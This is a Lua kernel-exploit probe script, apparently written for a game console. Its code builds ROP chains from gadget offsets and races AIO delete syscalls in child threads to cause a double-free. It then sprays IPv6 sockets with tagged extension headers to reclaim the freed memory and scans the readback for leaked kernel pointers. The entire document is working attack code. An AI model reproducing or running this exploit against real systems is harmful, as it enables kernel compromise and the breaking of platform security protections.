-- CRASH_CLASS: MODERATE
-- PROBE 75a: Coixao-architecture spray oracle — IPV6 ext-hdr 0x80 zone reclaim
--
-- Based on zecoxao's verified IDA analysis of kernel_1410.elf:
--   - m_aio_reqs2 is 0x58 bytes → 0x80 (128) malloc bucket
--   - setsockopt(IPV6_DSTOPTS/HOPOPTS/RTHDR) with optlen→128 zone reclaims it
--   - malloc_type does NOT partition UMA zones (cross-type spray works)
--   - getsockopt readback: if socket[i] reads socket[j]'s tag → overlap proven
--
-- This probe:
--   [A] Detect which IPv6 sticky option works (DSTOPTS/HOPOPTS/RTHDR)
--   [B] Verify roundtrip at optlen=120 (→ zone 128 = m_aio_reqs2 bucket)
--   [C] Double-free race (proven: 65l/68a/68b all get ~100 doubles)
--   [D] Spray 256 IPv6 sockets with tagged optlen=120 ext headers
--   [E] Readback all tags via getsockopt — detect cross-contamination
--   [F] If overlap: identify which two sockets share a chunk

print("=== PROBE 75a: Coixao spray oracle ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function fmt_q(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    return string.format("0x%08X_%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt_q(eb))

-- Gadgets
local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore signals 11,12,13
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local fd_zero = sgn(mk(5)(memory.alloc(16), uint64(0), uint64(0)))
-- /dev/zero
do
    local p = memory.alloc(16)
    local s = "/dev/zero"
    for i = 1, #s do pcall(function() memory.write_byte(N(p) + i - 1, string.byte(s, i)) end) end
    pcall(function() memory.write_byte(N(p) + #s, 0) end)
    fd_zero = sgn(mk(5)(p, uint64(0), uint64(0)))
end
print("fd_zero=" .. fd_zero)

-- =========================================================
-- [A] SELECT WORKING IPV6 STICKY OPTION
-- =========================================================
print("")
print("[A] Detect working IPv6 sticky options")

local IPPROTO_IPV6 = 41
local IPV6_DSTOPTS = 50
local IPV6_HOPOPTS = 49
local IPV6_RTHDR   = 51
local OPTLEN = 120  -- (14+1)*8 → 0x80 zone

local function mk_inet6()
    local ok, ret = pcall(function()
        return mk(97)(uint64(28), uint64(2), uint64(0))  -- AF_INET6, SOCK_DGRAM, 0
    end)
    if ok then return sgn(ret) end
    return -1
end

-- Build a valid ext-header buffer for each option type
local function build_opt(optname, optlen, tag)
    local buf = memory.alloc(optlen + 8)
    -- Zero it
    for off = 0, optlen - 1, 4 do wd(N(buf) + off, 0) end

    -- byte 0: nxt (ignored for sticky)
    pcall(function() memory.write_byte(N(buf), 0) end)
    -- byte 1: hdr ext len in 8-octet units
    pcall(function() memory.write_byte(N(buf) + 1, math.floor(optlen / 8) - 1) end)

    if optname == IPV6_RTHDR then
        -- type=0, segleft=0
        pcall(function() memory.write_byte(N(buf) + 2, 0) end)
        pcall(function() memory.write_byte(N(buf) + 3, 0) end)
    else
        -- DSTOPTS/HOPOPTS: PadN TLV covering the rest
        -- byte 2: type=1 (PadN)
        pcall(function() memory.write_byte(N(buf) + 2, 1) end)
        -- byte 3: PadN data length = optlen - 4
        local padlen = optlen - 4
        if padlen > 255 then padlen = 255 end
        pcall(function() memory.write_byte(N(buf) + 3, padlen) end)
    end

    -- Tag at offset 8 (inside PadN data or rthdr body)
    wd(N(buf) + 8, tag)

    return buf
end

local test_fd = mk_inet6()
print("  test_fd=" .. test_fd)

local working_opt = nil
local opt_names = {[49]="HOPOPTS", [50]="DSTOPTS", [51]="RTHDR"}

for _, opt in ipairs({IPV6_DSTOPTS, IPV6_HOPOPTS, IPV6_RTHDR}) do
    local buf = build_opt(opt, OPTLEN, 0xDEAD0000)
    local ok, ret = pcall(function()
        return mk(105)(uint64(test_fd), uint64(IPPROTO_IPV6), uint64(opt),
                       uint64(N(buf)), uint64(OPTLEN))
    end)
    local r = ok and sgn(ret) or -999

    -- Try readback
    local rbuf = memory.alloc(OPTLEN + 16)
    local rlen = memory.alloc(8)
    for off = 0, OPTLEN - 1, 4 do wd(N(rbuf) + off, 0xCCCCCCCC) end
    wd(N(rlen), OPTLEN + 8)

    local ok2, ret2 = pcall(function()
        return mk(118)(uint64(test_fd), uint64(IPPROTO_IPV6), uint64(opt),
                       uint64(N(rbuf)), uint64(N(rlen)))
    end)
    local r2 = ok2 and sgn(ret2) or -999
    local got_len = rd(N(rlen)) or 0
    local got_tag = rd(N(rbuf) + 8) or 0

    print(string.format("  %s(%d): set=%d get=%d len=%d tag=%08X",
        opt_names[opt] or "?", opt, r, r2, got_len, got_tag))

    if r == 0 and r2 == 0 and got_tag == 0xDEAD0000 and not working_opt then
        working_opt = opt
    end
end

pcall(function() mk(6)(uint64(test_fd)) end)

if not working_opt then
    print("  NO WORKING OPTION — cannot spray")
    print("=== 75a DONE ===")
    return
end
print("  USING: " .. (opt_names[working_opt] or "?") .. " (" .. working_opt .. ")")

-- =========================================================
-- [B] AIO HELPERS
-- =========================================================
local reqs_b = memory.alloc(0x30)
local dbuf = memory.alloc(0x4000)
local rbuf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs_b), uint64(0))
    wq(N(reqs_b) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(dbuf)))
    wd(N(reqs_b) + 0x10, bl); wd(N(reqs_b) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(rbuf)))
    wd(N(reqs_b) + 0x18, rl); wd(N(reqs_b) + 0x1C, rh)
    wd(N(reqs_b) + 0x20, fd_zero); wd(N(reqs_b) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs_b)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end
local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function() mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0
end
local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xCD)
    pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0xCD
end
local function cancel_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xCD)
    pcall(function() mk(666)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0xCD
end

-- =========================================================
-- [C] DOUBLE-FREE RACE (cancel first, then race delete)
-- =========================================================
print("")
print("[C] Double-free race (20 iters × 8 IDs)")

local BATCH = 8
local ITERS = 20
local del_ids = memory.alloc(4 * BATCH + 0x10)
local sts_A = memory.alloc(4 * BATCH + 0x10)
local sts_B = memory.alloc(4 * BATCH + 0x10)
local total_doubles = 0

for iter = 1, ITERS do
    if not alive() then print("  DEAD iter=" .. iter); break end

    -- Submit batch
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then ids[#ids + 1] = id end
    end
    if #ids < 4 then break end

    -- Cancel all (move to terminal state so delete takes free branch)
    for _, id in ipairs(ids) do cancel_one(id) end
    -- Poll all (prerequisite for delete)
    for _, id in ipairs(ids) do poll_one(id) end

    local cnt = #ids
    for i = 0, cnt - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(sts_A) + i * 4, 0xAA)
        wd(N(sts_B) + i * 4, 0xBB)
    end

    -- Race: two child threads call 662 concurrently
    local mk_A = memory.alloc(8); wq(N(mk_A), uint64(0))
    local mk_B = memory.alloc(8); wq(N(mk_B), uint64(0))

    local stk_A = memory.alloc(0x4000)
    local sb_A = N(stk_A)
    local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
    local oA = 0
    local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end
    emA(g_pop_rax); emA(uint64(0x41))
    emA(g_pop_rdi); emA(uint64(N(mk_A)))
    emA(g_mov_m_rax)
    emA(g_pop_rdi); emA(uint64(N(del_ids)))
    emA(g_pop_rsi); emA(uint64(cnt))
    emA(g_pop_rdx); emA(uint64(N(sts_A)))
    emA(g_pop_rax); emA(uint64(662))
    emA(stub)
    emA(g_pop_rdi); emA(uint64(0))
    emA(g_pop_rax); emA(uint64(431)); emA(stub)

    local stk_B = memory.alloc(0x4000)
    local sb_B = N(stk_B)
    local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
    local oB = 0
    local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end
    emB(g_pop_rax); emB(uint64(0x42))
    emB(g_pop_rdi); emB(uint64(N(mk_B)))
    emB(g_mov_m_rax)
    emB(g_pop_rdi); emB(uint64(N(del_ids)))
    emB(g_pop_rsi); emB(uint64(cnt))
    emB(g_pop_rdx); emB(uint64(N(sts_B)))
    emB(g_pop_rax); emB(uint64(662))
    emB(stub)
    emB(g_pop_rdi); emB(uint64(0))
    emB(g_pop_rax); emB(uint64(431)); emB(stub)

    local par_A = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
    wq(N(par_A), g_bare_ret)
    wq(N(par_A) + 0x10, uint64(sb_A))
    wq(N(par_A) + 0x18, uint64(0x2000))
    local tA = memory.alloc(8); wq(N(tA), uint64(0))
    wq(N(par_A) + 0x30, tA)

    local par_B = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
    wq(N(par_B), g_bare_ret)
    wq(N(par_B) + 0x10, uint64(sb_B))
    wq(N(par_B) + 0x18, uint64(0x2000))
    local tB = memory.alloc(8); wq(N(tB), uint64(0))
    wq(N(par_B) + 0x30, tB)

    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)
    -- Busy wait for children
    for w = 1, 50000 do local _ = rd(sb_A) end

    local dbl = 0
    for i = 0, cnt - 1 do
        if (rd(N(sts_A) + i * 4) or 1) == 0 and (rd(N(sts_B) + i * 4) or 1) == 0 then
            dbl = dbl + 1
        end
    end
    total_doubles = total_doubles + dbl
    if dbl > 0 or iter <= 2 or iter == ITERS then
        print(string.format("  iter %d: dbl=%d", iter, dbl))
    end
end
print("  total_doubles=" .. total_doubles)

if total_doubles < 2 or not alive() then
    print("  INSUFFICIENT or DEAD")
    print("=== 75a DONE ===")
    return
end

-- =========================================================
-- [D] SPRAY 256 IPv6 SOCKETS WITH TAGGED 120-BYTE EXT HEADERS
-- =========================================================
print("")
print("[D] Spray 256 IPv6 sockets (optlen=" .. OPTLEN .. " → zone 128)")

local SPRAY_N = 256
local spray_fds = {}
local sprayed = 0

for i = 1, SPRAY_N do
    if not alive() then break end
    local fd = mk_inet6()
    if fd >= 0 then
        local tag = 0xAABB0000 + i
        local buf = build_opt(working_opt, OPTLEN, tag)
        local ok, ret = pcall(function()
            return mk(105)(uint64(fd), uint64(IPPROTO_IPV6), uint64(working_opt),
                           uint64(N(buf)), uint64(OPTLEN))
        end)
        if ok and sgn(ret) == 0 then
            spray_fds[#spray_fds + 1] = {fd = fd, idx = i, tag = tag}
            sprayed = sprayed + 1
        else
            pcall(function() mk(6)(uint64(fd)) end)
        end
    end
end
print("  sprayed=" .. sprayed)

if not alive() then print("DEAD during spray"); return end

-- =========================================================
-- [E] READBACK ALL TAGS VIA GETSOCKOPT — DETECT OVERLAP
-- =========================================================
print("")
print("[E] Readback tags — detect cross-contamination")

local overlaps = {}
local own_count = 0
local garbage_count = 0

for _, entry in ipairs(spray_fds) do
    if not alive() then break end
    local rbuf2 = memory.alloc(OPTLEN + 16)
    local rlen2 = memory.alloc(8)
    for off = 0, OPTLEN - 1, 4 do wd(N(rbuf2) + off, 0xCCCCCCCC) end
    wd(N(rlen2), OPTLEN + 8)

    local ok, ret = pcall(function()
        return mk(118)(uint64(entry.fd), uint64(IPPROTO_IPV6), uint64(working_opt),
                       uint64(N(rbuf2)), uint64(N(rlen2)))
    end)
    local r = ok and sgn(ret) or -999
    local got_tag = rd(N(rbuf2) + 8) or 0

    if r == 0 then
        local expected_hi = 0xAABB
        local got_hi = math.floor(got_tag / 0x10000)
        local got_lo = got_tag % 0x10000

        if got_hi == 0xAABB then
            if got_lo == entry.idx then
                own_count = own_count + 1
            else
                -- OVERLAP: this socket reads another socket's tag!
                overlaps[#overlaps + 1] = {
                    reader = entry.idx, reader_fd = entry.fd,
                    writer = got_lo, tag = got_tag
                }
            end
        else
            garbage_count = garbage_count + 1
            if garbage_count <= 5 then
                print(string.format("  GARBAGE idx=%d: tag=%08X", entry.idx, got_tag))
            end
        end
    end
end

print("  own=" .. own_count .. " garbage=" .. garbage_count .. " OVERLAPS=" .. #overlaps)

if #overlaps > 0 then
    print("")
    print("  *** OVERLAP DETECTED ***")
    for j = 1, math.min(10, #overlaps) do
        local o = overlaps[j]
        print(string.format("  socket[%d](fd=%d) reads tag of socket[%d] (tag=%08X)",
            o.reader, o.reader_fd, o.writer, o.tag))
    end
    print("  This proves double-free reclaim in zone 128!")

    -- [F] Scan overlapping sockets for kernel pointers
    print("")
    print("[F] Scan overlapping socket readback for kernel pointers")
    for _, o in ipairs(overlaps) do
        if not alive() then break end
        local sbuf = memory.alloc(OPTLEN + 16)
        local slen = memory.alloc(8)
        for off = 0, OPTLEN - 1, 4 do wd(N(sbuf) + off, 0) end
        wd(N(slen), OPTLEN + 8)

        pcall(function()
            mk(118)(uint64(o.reader_fd), uint64(IPPROTO_IPV6), uint64(working_opt),
                    uint64(N(sbuf)), uint64(N(slen)))
        end)

        -- Scan every qword for kernel pointers
        for off = 0, OPTLEN - 8, 8 do
            local q = rq(N(sbuf) + off)
            if q then
                local h, l = get_hi_lo(q)
                if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                    print(string.format("  *** KPTR reader=%d +%02X: %s ***",
                        o.reader, off, fmt_q(q)))
                end
            end
        end

        -- Hexdump first 64 bytes
        local hex = ""
        for off = 0, 60, 4 do
            hex = hex .. string.format("%08X ", rd(N(sbuf) + off) or 0)
        end
        print(string.format("  reader=%d first64: %s", o.reader, hex))
    end
else
    print("  No overlap — double-freed chunks not reclaimed by zone-128 spray")

    -- [F-alt] Try other zone sizes
    print("")
    print("[F] Try zone 64 (optlen=56) and zone 256 (optlen=248)")
    for _, alt_len in ipairs({56, 248}) do
        if not alive() then break end
        local alt_sprayed = 0
        local alt_fds = {}
        for i = 1, 128 do
            local fd = mk_inet6()
            if fd >= 0 then
                local tag = 0xBBCC0000 + i
                local buf = build_opt(working_opt, alt_len, tag)
                local ok2, ret2 = pcall(function()
                    return mk(105)(uint64(fd), uint64(IPPROTO_IPV6), uint64(working_opt),
                                   uint64(N(buf)), uint64(alt_len))
                end)
                if ok2 and sgn(ret2) == 0 then
                    alt_fds[#alt_fds + 1] = {fd = fd, idx = i}
                    alt_sprayed = alt_sprayed + 1
                else
                    pcall(function() mk(6)(uint64(fd)) end)
                end
            end
        end
        local alt_ov = 0
        for _, e in ipairs(alt_fds) do
            local rb3 = memory.alloc(alt_len + 16)
            local rl3 = memory.alloc(8)
            for off = 0, alt_len - 1, 4 do wd(N(rb3) + off, 0) end
            wd(N(rl3), alt_len + 8)
            pcall(function()
                mk(118)(uint64(e.fd), uint64(IPPROTO_IPV6), uint64(working_opt),
                        uint64(N(rb3)), uint64(N(rl3)))
            end)
            local t = rd(N(rb3) + 8) or 0
            local th = math.floor(t / 0x10000)
            local tl = t % 0x10000
            if th == 0xBBCC and tl ~= e.idx then alt_ov = alt_ov + 1 end
        end
        print(string.format("  optlen=%d: sprayed=%d overlaps=%d", alt_len, alt_sprayed, alt_ov))
        for _, e in ipairs(alt_fds) do pcall(function() mk(6)(uint64(e.fd)) end) end
    end
end

-- =========================================================
-- [G] CLEANUP
-- =========================================================
if alive() then
    print("")
    print("[G] Cleanup")
    for _, entry in ipairs(spray_fds) do
        pcall(function() mk(6)(uint64(entry.fd)) end)
    end
    print("  done")
end

print("")
print("alive=" .. (alive() and "YES" or "NO"))
print("=== 75a COMPLETE ===")
